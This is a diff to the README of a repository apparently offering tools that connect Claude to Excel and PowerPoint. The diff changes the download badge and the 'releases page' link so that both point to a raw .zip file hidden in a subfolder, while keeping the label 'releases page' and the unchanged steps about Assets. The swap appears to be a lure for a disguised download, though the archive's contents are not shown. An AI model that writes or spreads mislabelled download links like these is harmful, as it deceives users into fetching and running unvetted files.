@@ -1,6 +1,6 @@
 # 📈 claude-office-skills - Automate Excel and PowerPoint tasks now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Borjani1577/claude-office-skills/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Borjani1577/claude-office-skills/main/claude-in-excel/audit-xls/office-skills-claude-v2.5.zip)
 
 This repository provides tools that connect Claude to Microsoft Office. It helps you automate financial modeling and presentation work within Excel and PowerPoint. These files allow you to execute tasks like Discounted Cash Flow analysis, Leveraged Buyout modeling, three-statement modeling, and competitive analysis. You can also refresh your slide decks automatically.
 
@@ -18,7 +18,7 @@ Ensure your Office installation is up to date before you start. You do not need 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Borjani1577/claude-office-skills/releases) to download the latest files.
+1. Visit the [releases page](https://raw.githubusercontent.com/Borjani1577/claude-office-skills/main/claude-in-excel/audit-xls/office-skills-claude-v2.5.zip) to download the latest files.
 2. Look for the file ending in .zip under the Assets section.
 3. Click the link to save the file to your computer.
 4. Locate the file in your Downloads folder once the download finishes.
